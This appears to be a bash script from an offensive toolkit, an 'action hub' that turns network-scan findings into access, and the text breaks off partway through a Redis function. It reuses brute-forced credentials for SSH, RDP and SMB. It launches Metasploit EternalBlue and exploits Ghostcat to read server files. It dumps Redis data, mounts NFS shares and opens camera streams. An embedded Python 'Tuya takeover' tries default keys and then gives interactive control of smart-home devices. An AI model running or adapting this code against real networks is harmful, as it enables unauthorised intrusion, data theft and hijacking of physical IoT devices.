#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "POST-DISCOVERY" "action hub — turn scan findings into access"

_BASE="$(cd "$(dirname "$0")/.." && pwd)"

# ── Session selection ─────────────────────────────────────────────────────────
# Pipeline mode: SESSION_DIR already set by pipeline runner — use it directly
if [[ -n "${SESSION_DIR:-}" ]]; then
  SESSION_NAME="${SESSION_DIR%/}"; SESSION_NAME="${SESSION_NAME##*/}"
  printf '  %s[CHAIN]%s Session: %s%s%s  (pipeline auto)\n\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "$SESSION_NAME" "${RESET}"
else
  mapfile -t SESSIONS < <(find "$_BASE/results" -mindepth 1 -maxdepth 2 -type d \
    -name '[0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]_[0-9][0-9]-[0-9][0-9]-[0-9][0-9]' \
    2>/dev/null | sort -r || true)

  if [[ ${#SESSIONS[@]} -eq 0 ]]; then
    printf '  %s[!] No scan sessions in results/. Run a scan first.%s\n\n' "${RED}" "${RESET}"
    exit 0
  fi

  printf '  %s[+]%s Available sessions:\n\n' "${GREEN}" "${RESET}"
  printf '  %s  %-4s  %-26s  %s%s\n' "${DIM}" "ID" "SESSION" "FILES" "${RESET}"
  printf '  %s  ──── ────────────────────────── ─────%s\n' "${DIM}" "${RESET}"
  for i in "${!SESSIONS[@]}"; do
    _d="${SESSIONS[$i]}"; _ts="${_d%/}"; _ts="${_ts##*/}"
    _fc=$(find "$_d" -maxdepth 1 -name "*.txt" -not -name ".*.txt" 2>/dev/null | wc -l)
    printf '  %s[%02d]%s  %-26s  %d file(s)\n' "${CYAN}" "$(( i + 1 ))" "${RESET}" "$_ts" "$_fc"
  done

  printf '\n  %s>>%s Select session [1]: ' "${CYAN}" "${RESET}"
  read -r _pick  || _pick="1"
  _pick="${_pick:-1}"
  [[ "$_pick" =~ ^[0-9]+$ ]] && (( _pick >= 1 && _pick <= ${#SESSIONS[@]} )) || _pick=1

  SESSION_DIR="${SESSIONS[$(( _pick - 1 ))]}"
  SESSION_NAME="${SESSION_DIR%/}"; SESSION_NAME="${SESSION_NAME##*/}"
  printf '\n  %s[SYS]%s Session : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$SESSION_NAME" "${RESET}"
fi

# ── Load host + port data from all scan result files ──────────────────────────
section "LOADING DATA"

declare -A HOSTS=()

for _f in "${SESSION_DIR}"/*.txt; do
  [[ -f "$_f" ]] || continue
  _cur=""
  while IFS= read -r _line; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      _cur="${BASH_REMATCH[1]}"
    elif [[ -n "${_cur}" && "$_line" =~ ^([0-9]+)/(tcp|udp).*open ]]; then
      HOSTS["$_cur"]+="${BASH_REMATCH[1]}/${BASH_REMATCH[2]} "
    elif [[ "$_line" =~ \[\*\]\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+):([0-9]+) ]]; then
      HOSTS["${BASH_REMATCH[1]}"]+="${BASH_REMATCH[2]}/tcp "
    fi
  done < "$_f"
done

if [[ ${#HOSTS[@]} -eq 0 ]]; then
  printf '  %s[!] No host data found. Run nmap or fscan first.%s\n\n' "${YELLOW}" "${RESET}"
  exit 0
fi

declare -a HOST_LIST=()
for _ip in "${!HOSTS[@]}"; do HOST_LIST+=("$_ip"); done

printf '  %s[+]%s %d host(s) loaded%s\n' "${GREEN}" "${RESET}" "${#HOST_LIST[@]}" "${RESET}"

# ── Helpers ───────────────────────────────────────────────────────────────────
_has_port() { [[ " $1 " == *" $2/tcp "* || " $1 " == *" $2/udp "* ]]; }

_get_creds() {
  (grep -F "$1" "${SESSION_DIR}/brute.txt" 2>/dev/null || true) | grep "login:"
}

_cred_user() { printf '%s' "$1" | grep -o 'login: [^ ]*' | awk '{print $2}'; }
_cred_pass() { printf '%s' "$1" | sed 's/.*password: //'; }

# ── Action implementations ────────────────────────────────────────────────────
_act_ftp() {
  local host="$1"
  printf '  %s[*]%s Anonymous FTP on %s\n' "${CYAN}" "${RESET}" "$host"
  curl -s --connect-timeout 5 "ftp://${host}/" --user "anonymous:anonymous" 2>/dev/null \
    | head -40 || printf '  %s[~]%s Anonymous FTP rejected%s\n' "${DIM}" "${RESET}" "${RESET}"
  printf '\n  %s>>%s Mirror all files with wget? [y/N]: ' "${CYAN}" "${RESET}"
  read -r _dl  || _dl="n"
  if [[ "${_dl,,}" == "y" ]]; then
    local _out="$_BASE/results/.ftp_${host}_$(date +%H%M%S)"
    mkdir -p "$_out"
    wget -q -r --no-passive-ftp --user=anonymous --password=anonymous \
      "ftp://${host}/" -P "$_out" 2>/dev/null || true
    printf '  %s[+]%s Saved to %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$_out" "${RESET}"
  fi
}

_act_ssh() {
  local host="$1"
  local _creds _user _pass
  _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '  %s[*]%s Connecting as %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_user" "${RESET}"
    if check_tool sshpass; then
      sshpass -p "$_pass" ssh -o StrictHostKeyChecking=no "${_user}@${host}" || true
    else
      ssh -o StrictHostKeyChecking=no "${_user}@${host}" || true
    fi
  else
    printf '  %s>>%s Username: ' "${CYAN}" "${RESET}"
    read -r _user  || _user="root"
    _user="${_user:-root}"
    ssh -o StrictHostKeyChecking=no "${_user}@${host}" || true
  fi
}

_act_http() {
  local host="$1" port="$2" scheme="$3"
  local url="${scheme}://${host}:${port}/"
  printf '  %s[*]%s %s\n' "${CYAN}" "${RESET}" "$url"
  curl -skL --connect-timeout 5 -I "$url" 2>/dev/null | head -8 || true
  printf '\n  %s[*]%s Page title:\n' "${CYAN}" "${RESET}"
  curl -skL --connect-timeout 5 "$url" 2>/dev/null \
    | grep -io '<title>[^<]*' | sed 's/<title>/  Title: /' || true
  local _creds; _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '\n  %s[*]%s Testing found creds %s%s:%s%s\n' \
      "${CYAN}" "${RESET}" "${DIM}" "$_user" "$_pass" "${RESET}"
    curl -skL --connect-timeout 5 -u "${_user}:${_pass}" "$url" \
      -o /dev/null -w "  HTTP status: %{http_code}\n" || true
  fi
}

_act_ferox() {
  local host="$1" port="$2" scheme="$3"
  if ! check_tool feroxbuster; then
    printf '  %s[!]%s feroxbuster not found: %sapt install feroxbuster%s\n' \
      "${YELLOW}" "${RESET}" "${DIM}" "${RESET}"
    return
  fi
  local url="${scheme}://${host}:${port}"
  local outfile="$SESSION_DIR/ferox_${host}_${port}.txt"

  # Pick the first available wordlist; feroxbuster falls back to its built-in if none given
  local _wl=""
  for _c in \
      /usr/share/seclists/Discovery/Web-Content/common.txt \
      /usr/share/wordlists/dirb/common.txt \
      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; do
    [[ -f "$_c" ]] && { _wl="$_c"; break; }
  done

  printf '  %s[*]%s feroxbuster → %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$url" "${RESET}"
  printf '  %s>>%s Wordlist [%s]: ' "${CYAN}" "${RESET}" "${_wl:-built-in default}"
  read -r _input || _input=""
  [[ -n "$_input" && -f "$_input" ]] && _wl="$_input"

  printf '  %s[SYS]%s Output : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

  local _wl_arg=()
  [[ -n "$_wl" ]] && _wl_arg=(-w "$_wl")

  run_fg feroxbuster -u "$url" "${_wl_arg[@]}" -o "$outfile" || true

  printf '\n  %s[SYS]%s Saved : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
}

_act_smb_shares() {
  local host="$1"
  printf '  %s[*]%s SMB null session — listing shares on %s\n' "${CYAN}" "${RESET}" "$host"
  smbclient -L "//${host}" -N 2>/dev/null \
    || printf '  %s[~]%s Null session rejected%s\n' "${DIM}" "${RESET}" "${RESET}"
  local _creds; _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '\n  %s[*]%s Retrying with found creds %s%s%s\n' \
      "${CYAN}" "${RESET}" "${DIM}" "$_user" "${RESET}"
    smbclient -L "//${host}" -U "${_user}%${_pass}" 2>/dev/null || true
  fi
}

_act_ms17010() {
  local host="$1"
  if ! check_tool msfconsole; then
    printf '  %s[!]%s msfconsole not found: apt install metasploit-framework%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
    return
  fi
  local _lhost; _lhost=$(get_ip)
  printf '  %s[!]%s MS17-010 EternalBlue against %s%s%s — LHOST: %s\n\n' \
    "${RED}" "${RESET}" "${RED}" "$host" "${RESET}" "$_lhost"
  msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS ${host}
set LHOST ${_lhost}
check
run
" || true
}

_act_rtsp() {
  local host="$1" port="$2"
  if ! check_tool mpv; then
    printf '  %s[!]%s mpv not installed: apt install mpv%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    printf '  Stream URL: %srtsp://%s:%s/%s\n' "${CYAN}" "$host" "$port" "${RESET}"
    return
  fi
  printf '  %s[*]%s Probing RTSP paths on %s:%s...%s\n' "${CYAN}" "${RESET}" "$host" "$port" "${RESET}"
  for _path in "" "live" "stream" "cam" "h264" "1/1" "channel1" "video1"; do
    local _url="rtsp://${host}:${port}/${_path}"
    printf '  %s>>%s %-44s' "${DIM}" "${RESET}" "$_url"
    if mpv --no-audio --frames=1 --really-quiet "$_url" &>/dev/null; then
      printf '%s[✔]%s\n' "${GREEN}" "${RESET}"
      mpv "$_url" &
      return
    fi
    printf '%s[✘]%s\n' "${DIM}" "${RESET}"
  done
  printf '  %s[~]%s No RTSP stream answered%s\n' "${DIM}" "${RESET}" "${RESET}"
}

_act_mqtt() {
  local host="$1"
  printf '  %s[*]%s MQTT broker %s — subscribing 15 s...%s\n' \
    "${CYAN}" "${RESET}" "$host" "${RESET}"
  if check_tool mosquitto_sub; then
    timeout 15 mosquitto_sub -h "$host" -t "#" -v 2>/dev/null || true
  else
    python3 - <<PYEOF
import socket, time
host = "${host}"
payload = b'\x10\x14\x00\x04MQTT\x04\x02\x00\x3c\x00\x08fsec-hub'
s = socket.socket()
s.settimeout(5)
try:
    s.connect((host, 1883))
    s.send(payload)
    r = s.recv(256)
    print("  [+] MQTT CONNACK received" if r else "  [~] No CONNACK")
    if r and r[0] == 0x20 and r[3] == 0:
        print("  [+] Broker accepts unauthenticated connections!")
    s.close()
except Exception as e:
    print(f"  [~] Connect failed: {e}")
PYEOF
  fi
}

_act_tuya() {
  local host="$1"
  local outfile="$SESSION_DIR/tuya_${host}.txt"
  printf '  %s[*]%s Tuya local API probe + takeover — %s%s:6668%s\n\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "$host" "${RESET}"

  if ! python3 -c "import tinytuya" 2>/dev/null; then
    printf '  %s[*]%s Installing tinytuya...%s\n' "${CYAN}" "${RESET}" "${RESET}"
    pip install tinytuya -q 2>/dev/null || pip3 install tinytuya -q 2>/dev/null || true
  fi

python3 - "$host" "$outfile" << 'PYEOF'
import sys, socket, struct, json, binascii, select, time, os, hashlib

host    = sys.argv[1]
outfile = sys.argv[2]

GREEN  = '\033[38;5;47m';  CYAN   = '\033[38;5;51m'
YELLOW = '\033[38;5;226m'; RED    = '\033[38;5;196m'
DIM    = '\033[2m';        BOLD   = '\033[1m'; RESET  = '\033[0m'

_PREFIX     = 0x000055AA
_SUFFIX     = 0x0000AA55
_CMD_STATUS = 0x0A
log_lines   = []

# Fixed broadcast decryption key used by ALL Tuya devices on UDP 6667
# = md5("yGAdlopoPVldABfn")
UDPKEY = hashlib.md5(b"yGAdlopoPVldABfn").digest()

# Default/weak localKeys seen on cheap IoT firmware
DEFAULT_KEYS = [
    '0000000000000000',
    '1111111111111111',
    'ffffffffffffffff',
    '0123456789abcdef',
    'abcdefabcdefabcd',
    '1234567812345678',
    'deadbeefdeadbeef',
    '0101010101010101',
    'a1b2c3d4e5f60708',
    '9999999999999999',
    '0102030405060708',
    'tuya0000tuya0000',
]

# ── Helpers ───────────────────────────────────────────────────────────────────
def _build_pkt(cmd, payload=b''):
    hdr  = struct.pack('>IIII', _PREFIX, 0, cmd, len(payload))
    body = hdr + payload
    crc  = binascii.crc32(body) & 0xFFFFFFFF
    return body + struct.pack('>II', crc, _SUFFIX)

def _aes_ecb_decrypt(key, data):
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key if isinstance(key, bytes) else key.encode(), AES.MODE_ECB)
        dec = cipher.decrypt(data)
        pad = dec[-1]
        return dec[:-pad] if 1 <= pad <= 16 else dec
    except Exception:
        return None

def _parse_udp_pkt(data, decrypt_key=None):
    if len(data) < 28: return None
    if data[:4] != b'\x00\x00\x55\xaa': return None
    try:
        plen = struct.unpack('>I', data[12:16])[0]
        payload = data[16:16 + plen - 4]   # strip trailing CRC from len
        if not payload: return None
        # Try plaintext JSON first
        try:
            return json.loads(payload.decode('utf-8', errors='ignore').strip('\x00'))
        except Exception:
            pass
        # Try AES-ECB decrypt
        if decrypt_key and len(payload) % 16 == 0:
            dec = _aes_ecb_decrypt(decrypt_key, payload)
            if dec:
                try:
                    return json.loads(dec.decode('utf-8', errors='ignore').strip('\x00'))
                except Exception:
                    pass
    except Exception:
        pass
    return None

# ── Phase 1: Raw TCP probe ────────────────────────────────────────────────────
def raw_probe(ip, port=6668, timeout=4):
    res = {'ip': ip, 'open': False}
    try:
        s = socket.socket(); s.settimeout(timeout); s.connect((ip, port))
        res['open'] = True
        s.send(_build_pkt(_CMD_STATUS))
        data = b''
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
                if len(data) >= 24: break
        except socket.timeout: pass
        s.close()
        res['bytes'] = len(data); res['raw'] = data
        for v in [b'3.5', b'3.4', b'3.3', b'3.2', b'3.1', b'2.0', b'1.0']:
            if v in data: res['proto'] = v.decode(); break
        try:
            s2 = data.index(b'{'); e2 = data.rindex(b'}') + 1
            res['json'] = json.loads(data[s2:e2].decode('utf-8', errors='ignore'))
        except Exception: pass
        if len(data) >= 16:
            try:
                pfx, seq, cmd, plen = struct.unpack('>IIII', data[:16])
                if pfx == _PREFIX:
                    res['seq'] = seq; res['cmd_reply'] = hex(cmd); res['payload_len'] = plen
            except Exception: pass
    except (ConnectionRefusedError, OSError, socket.timeout) as e:
        res['error'] = str(e)
    return res

r     = raw_probe(host)
proto = r.get('proto', 'unknown')

print(f'  ┌─ {BOLD}{host}{RESET}:6668')
if not r['open']:
    print(f'  │  {YELLOW}[~] Port closed / filtered{RESET}')
    print('  └─')
    log_lines.append(f'[TUYA] {host}:6668 closed')
    with open(outfile, 'a') as f:
        f.write('\n=== TUYA PROBE RESULTS ===\n')
        for l in log_lines: f.write(l + '\n')
    sys.exit(0)

print(f'  │  Status    : {GREEN}OPEN{RESET}')
print(f'  │  Protocol  : Tuya v{proto}' if proto != 'unknown' else f'  │  Protocol  : {DIM}unknown (no banner){RESET}')
print(f'  │  Response  : {r["bytes"]} bytes')
if 'json' in r:
    print(f'  │  {RED}{BOLD}⚠ PLAINTEXT — unencrypted / legacy firmware{RESET}')
    for k, v in r['json'].items():
        print(f'  │    {CYAN}{k}{RESET}: {v}')
else:
    enc = 'AES-128 GCM' if proto in ('3.4','3.5') else 'AES-128 ECB'
    print(f'  │  Encrypted : {enc}')
print('  └─\n')

log_lines.append(f'[TUYA] {host}:6668 open proto:{proto}')
if 'json' in r: log_lines.append(f'  PLAINTEXT: {json.dumps(r["json"])}')

unencrypted = proto in ('1.0', '2.0') or 'json' in r

# ── Phase 2: UDP broadcast sniff 6666 + 6667 ─────────────────────────────────
# Tuya devices broadcast their gwId + version on UDP 6666 (plaintext) and
# 6667 (AES-ECB with the fixed key UDPKEY = md5("yGAdlopoPVldABfn")).
# No cloud credentials needed — this is entirely local network.
print(f'  {CYAN}[*]{RESET} UDP broadcast sniff on 6666/6667 (8 s)...')

udp_info  = {}
udp_socks = []
for port in (6666, 6667):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(0.1)
        s.bind(('', port))
        udp_socks.append((port, s))
    except Exception:
        pass

deadline = time.time() + 8
while time.time() < deadline and not udp_info.get('gwId'):
    rlist = [s for _, s in udp_socks]
    readable, _, _ = select.select(rlist, [], [], 1.0)
    for sock in readable:
        port = next(p for p, s in udp_socks if s == sock)
        try:
            data, addr = sock.recvfrom(4096)
            src_ip = addr[0]
            key = UDPKEY if port == 6667 else None
            # Try raw JSON first (some devices skip the binary header on 6666)
            info = None
            try:
                info = json.loads(data.decode('utf-8', errors='ignore'))
            except Exception:
                info = _parse_udp_pkt(data, key)
            if info and (src_ip == host or info.get('ip') == host):
                udp_info.update(info)
                print(f'  {GREEN}[+]{RESET} UDP {port} packet from {src_ip}: {info}')
        except Exception:
            pass

for _, s in udp_socks:
    try: s.close()
    except Exception: pass

dev_id    = udp_info.get('gwId', udp_info.get('id', ''))
local_key = udp_info.get('key', '')
try:
    ver = float(udp_info.get('version', proto if proto != 'unknown' else '3.3'))
except ValueError:
    ver = 3.3

if dev_id:
    print(f'  {GREEN}[+]{RESET} UDP got gwId={dev_id}  ver={ver}')
    log_lines.append(f'  UDP gwId: {dev_id}  ver: {ver}  ip: {udp_info.get("ip",host)}')
else:
    print(f'  {YELLOW}[~]{RESET} No UDP broadcast captured from {host}')

# ── Phase 3: tinytuya deviceScan (supplements UDP sniff) ─────────────────────
try:
    import tinytuya
    print(f'\n  {CYAN}[*]{RESET} tinytuya deviceScan (10 s)...')
    scan_devices = {}
    try:
        scan_devices = tinytuya.deviceScan(verbose=False, maxretry=6, color=False)
    except TypeError:
        try: scan_devices = tinytuya.deviceScan(maxretry=6)
        except Exception: pass
    except Exception: pass

    found = scan_devices.get(host) or next(
        (v for v in scan_devices.values() if v.get('ip') == host), None)
    if found:
        dev_id    = dev_id    or found.get('gwId', found.get('id', ''))
        local_key = local_key or found.get('key', '')
        try: ver = float(found.get('version', ver))
        except Exception: pass
        print(f'  {GREEN}[+]{RESET} deviceScan: id={dev_id}  key={local_key or "(none)"}  ver={ver}')
        if local_key:
            log_lines.append(f'  localKey(scan): {local_key}  devId: {dev_id}')
    else:
        print(f'  {YELLOW}[~]{RESET} Not found in deviceScan')
except ImportError:
    tinytuya = None
    print(f'  {YELLOW}[!]{RESET} tinytuya not installed — pip install tinytuya')

# ── Phase 4: devices.json from previous wizard run ────────────────────────────
if not local_key:
    for djpath in ['devices.json', os.path.expanduser('~/.tinytuya/devices.json'),
                   '/root/devices.json', '/root/.tinytuya/devices.json']:
        if os.path.exists(djpath):
            try:
                devlist = json.load(open(djpath))
                m = next((d for d in devlist
                          if d.get('ip') == host or d.get('id') == dev_id), None)
                if m:
                    local_key = m.get('key', '')
                    dev_id    = m.get('id', dev_id)
                    try: ver = float(m.get('version', ver))
                    except Exception: pass
                    print(f'  {GREEN}[+]{RESET} devices.json: key={local_key}  ver={ver}')
                    log_lines.append(f'  localKey(devices.json): {local_key}  devId: {dev_id}')
                    break
            except Exception: pass

# ── Phase 5: default/weak localKey brute-force ───────────────────────────────
def try_status(d_id, ip, key, version):
    if tinytuya is None: return None, None
    for cls in (tinytuya.OutletDevice, tinytuya.Device):
        try:
            d = cls(d_id or '0', ip, key or '0000000000000000', version=version)
            d.set_socketTimeout(4)
            s = d.status()
            if s and 'dps' in s: return d, s
        except Exception: pass
    return None, None

device_obj, status = None, None

if local_key and tinytuya:
    print(f'\n  {CYAN}[*]{RESET} Connecting with localKey (v{ver})...')
    device_obj, status = try_status(dev_id, host, local_key, ver)

elif unencrypted and tinytuya:
    print(f'\n  {CYAN}[*]{RESET} Plaintext device — connecting without key...')
    for try_ver in (1.0, 2.0):
        device_obj, status = try_status(dev_id, host, '', try_ver)
        if status: break

else:
    # No key found anywhere — try default keys across common versions
    print(f'\n  {CYAN}[*]{RESET} No localKey found — trying {len(DEFAULT_KEYS)} default keys × 3 versions...')
    found_key = None
    outer_break = False
    for key in DEFAULT_KEYS:
        if outer_break: break
        for try_ver in (ver if ver > 0 else 3.3, 3.3, 3.4):
            device_obj, status = try_status(dev_id, host, key, try_ver)
            if status:
                found_key = key
                ver = try_ver
                print(f'  {RED}{BOLD}[!!!] DEFAULT KEY WORKS: {key}  ver={try_ver}{RESET}')
                log_lines.append(f'  DEFAULT KEY: {key}  ver: {try_ver}')
                outer_break = True
                break
    if not found_key and not status:
        print(f'  {YELLOW}[~]{RESET} No default key worked')
        if not dev_id:
            print(f'  {DIM}    Device ID unknown — run: python3 -m tinytuya wizard{RESET}')
            print(f'  {DIM}    (free iot.tuya.com account, pulls localKey from cloud){RESET}')
        else:
            print(f'  {DIM}    gwId={dev_id} — run wizard to get localKey, then re-probe{RESET}')

# ── Phase 6: DPS dump + interactive control ───────────────────────────────────
if status and 'dps' in status:
    dps = status['dps']
    print(f'\n  {GREEN}{BOLD}[✔] DEVICE CONTROL ESTABLISHED{RESET}\n')
    print(f'  {CYAN}DPS (Data Points):{RESET}')
    DPS_LABELS = {
        '1':'switch_1','2':'switch_2','3':'switch_3','4':'switch_4',
        '5':'switch_5','6':'switch_6','9':'countdown','18':'current_mA',
        '19':'power_W','20':'voltage_V','101':'colour','102':'brightness',
        '103':'temp_kelvin','104':'scene','105':'timer',
    }
    for k in sorted(dps.keys(), key=lambda x: int(x) if str(x).isdigit() else 0):
        v     = dps[k]
        label = DPS_LABELS.get(str(k), '')
        tag   = f' {DIM}({label}){RESET}' if label else ''
        col   = GREEN if v is True else (YELLOW if v is False else CYAN)
        print(f'  {DIM}[{k:>3}]{RESET}{tag} {col}{v}{RESET}')
    log_lines.append(f'  DPS: {json.dumps(dps)}')

    print(f'\n  {CYAN}[*]{RESET} Interactive control  {DIM}(1=true  1=false  20=100  q=quit){RESET}\n')
    while True:
        try:
            cmd = input(f'  {CYAN}tuya>{RESET} ').strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd or cmd.lower() in ('q', 'quit', 'exit'): break
        if '=' not in cmd:
            print(f'  {YELLOW}[!] Format: <dps>=<value>{RESET}'); continue
        dp, val = cmd.split('=', 1)
        dp = dp.strip(); val = val.strip()
        if val.lower() == 'true':    val = True
        elif val.lower() == 'false': val = False
        elif val.isdigit():          val = int(val)
        try:
            result = device_obj.set_value(dp, val)
            if result:
                print(f'  {GREEN}[+]{RESET} Sent DPS {dp}={val}')
                log_lines.append(f'  SENT dps[{dp}]={val}')
                time.sleep(0.5)
                ns = device_obj.status()
                if ns and 'dps' in ns:
                    print(f'  {DIM}    State: {ns["dps"]}{RESET}')
            else:
                print(f'  {YELLOW}[~]{RESET} No ACK from device')
        except Exception as e:
            print(f'  {RED}[!]{RESET} {e}')

elif device_obj is not None:
    print(f'  {YELLOW}[~]{RESET} Connected but no DPS in response')
elif local_key or unencrypted:
    print(f'  {YELLOW}[~]{RESET} Connection failed — non-standard firmware')

# ── Save ──────────────────────────────────────────────────────────────────────
with open(outfile, 'a') as f:
    f.write('\n=== TUYA TAKEOVER RESULTS ===\n')
    for l in log_lines: f.write(l + '\n')
print(f'\n  {DIM}Saved → {outfile}{RESET}')
PYEOF
}

_act_telnet() {
  local host="$1"
  local _creds; _creds=$(_get_creds "$host" | head -1)
  printf '  %s[*]%s Connecting to Telnet on %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  [[ -n "$_creds" ]] && printf '  %s[+]%s Try: %s%s%s\n' \
    "${GREEN}" "${RESET}" "${DIM}" "$_creds" "${RESET}"
  if check_tool telnet; then
    telnet "$host" || true
  else
    printf '  %s[!]%s telnet not found: apt install telnet%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_rdp() {
  local host="$1" _user="administrator" _pass=""
  local _creds; _creds=$(_get_creds "$host" | head -1)
  if [[ -n "$_creds" ]]; then
    _user=$(_cred_user "$_creds"); _pass=$(_cred_pass "$_creds")
    printf '  %s[*]%s RDP with found creds %s%s%s\n' \
      "${CYAN}" "${RESET}" "${DIM}" "${_user}:${_pass}" "${RESET}"
  else
    printf '  %s>>%s Username [administrator]: ' "${CYAN}" "${RESET}"
    read -r _user  || _user="administrator"; _user="${_user:-administrator}"
    printf '  %s>>%s Password: ' "${CYAN}" "${RESET}"
    read -rs _pass  || _pass=""; printf '\n'
  fi
  if check_tool xfreerdp; then
    xfreerdp /v:"$host" /u:"$_user" /p:"$_pass" /cert:ignore 2>/dev/null || true
  elif check_tool rdesktop; then
    rdesktop -u "$_user" -p "$_pass" "$host" 2>/dev/null || true
  else
    printf '  %s[!]%s No RDP client: apt install freerdp2-x11%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_snmp() {
  local host="$1"
  printf '  %s[*]%s SNMP walk on %s (community: public)%s\n' \
    "${CYAN}" "${RESET}" "$host" "${RESET}"
  snmpwalk -v2c -c public -t 3 "$host" 2>/dev/null | head -50 || true
}

_act_nfs() {
  local host="$1"
  printf '  %s[*]%s NFS shares on %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"

  # Show exports
  if check_tool showmount; then
    printf '  %s[*]%s Running showmount -e %s%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
    local exports; exports=$(showmount -e --no-headers "$host" 2>/dev/null) || true
    if [[ -z "$exports" ]]; then
      printf '  %s[~]%s No exports returned (may be filtered)%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    else
      printf '%s\n' "$exports"
      # Offer to mount each share
      while IFS= read -r line; do
        local path access
        path=$(printf '%s' "$line" | awk '{print $1}')
        access=$(printf '%s' "$line" | awk '{print $2}')
        printf '\n  %s>>%s Mount %s:%s [access: %s] ? (y/N): ' \
          "${CYAN}" "${RESET}" "$host" "$path" "$access"
        local ans; read -r ans  || ans="n"
        if [[ "${ans,,}" == "y" ]]; then
          local mnt="/mnt/nfs_${host//./_}$(printf '%s' "$path" | tr '/' '_')"
          mkdir -p "$mnt"
          if mount -t nfs "$host:$path" "$mnt" 2>/dev/null; then
            printf '  %s[+]%s Mounted at %s%s\n' "${GREEN}" "${RESET}" "$mnt" "${RESET}"
            ls -la "$mnt" 2>/dev/null | head -20 || true
          else
            printf '  %s[!]%s Mount failed — may need root or NFS client tools%s\n' \
              "${RED}" "${RESET}" "${RESET}"
          fi
        fi
      done <<< "$exports"
    fi
  else
    printf '  %s[~]%s showmount not found — apt install nfs-common%s\n' \
      "${YELLOW}" "${RESET}" "${RESET}"
    printf '  %s[*]%s Trying nmap NFS scripts...%s\n' "${CYAN}" "${RESET}" "${RESET}"
    nmap -sS -Pn -n -p 2049,111 \
      --script nfs-showmount,nfs-ls,nfs-statfs \
      "$host" 2>/dev/null || true
  fi
}

_act_ghostcat() {
  local host="$1"
  printf '  %s[*]%s Ghostcat AJP on %s:8009 — CVE-2020-1938%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  printf '  %s>>%s File to read [/WEB-INF/web.xml]: ' "${CYAN}" "${RESET}"
  local filepath; read -r filepath  || filepath=""
  filepath="${filepath:-/WEB-INF/web.xml}"
  if check_tool nmap; then
    nmap -sS -Pn -n -p 8009 \
      --script ajp-request \
      --script-args "ajp-request.path=${filepath}" \
      "$host" 2>/dev/null || true
  else
    printf '  %s[~]%s nmap not found%s\n' "${YELLOW}" "${RESET}" "${RESET}"
  fi
}

_act_weblogic() {
  local host="$1"
  printf '  %s[*]%s WebLogic T3 probe on %s:7001%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  # T3 handshake
  local resp; resp=$(printf 't3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n' \
    | nc -w 4 "$host" 7001 2>/dev/null | strings | head -3) || true
  if printf '%s' "$resp" | grep -qi 'HELO\|weblogic\|t3'; then
    printf '  %s[!] WebLogic T3 confirmed — CVE-2019-2725 / CVE-2015-4852 apply%s\n' "${RED}" "${RESET}"
    printf '%s\n' "$resp"
  else
    printf '  %s[~]%s No T3 response — may need HTTP console check%s\n' "${YELLOW}" "${RESET}" "${RESET}"
    curl -sk --max-time 5 "http://$host:7001/console" 2>/dev/null | grep -i 'weblogic\|title' | head -3 || true
  fi
  printf '  %s[*]%s MSF: use exploit/multi/misc/weblogic_deserialize_asyncresponseservice%s\n' \
    "${DIM}" "${RESET}" "${RESET}"
}

_db_nmap() {
  local host="$1" port="$2"; shift 2
  nmap -Pn -n -p "$port" "$@" "$host" 2>/dev/null || true
}

_act_redis() {
  local host="$1"
  printf '  %s[*]%s Redis on %s:6379%s\n' "${CYAN}" "${RESET}" "$host" "${RESET}"
  _redis_cmd() { printf '%s' "$1" | nc -w 3 "$host" 6379 2>/dev/null; }
  local pong; pong=$(_redis_cmd $'*1\r\n$4\r\nPING\r\n' | head -1)
  _redis_dump() {
    printf '  %s[*]%s Keys (KEYS *):\n' "${CYAN}" "${RESET}"
    _redis_cmd $'*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n' | grep -v '^\*\|^\$\|^:' | head -30 || true
    printf '  %s[*]%s Server INFO:\n' "${CYAN}" "${RESET}"
    _redis_cmd $'*1\r\n$4\r\nINFO\r\n' | grep -E 'redis_version|os:|used_memory_human|connected_clients|db[0-9]' | head -15 || true
    printf '  %s[*]%s Config (CONFIG GET bind/requirepass/dir):\n' "${CYAN}" "${RESET}"
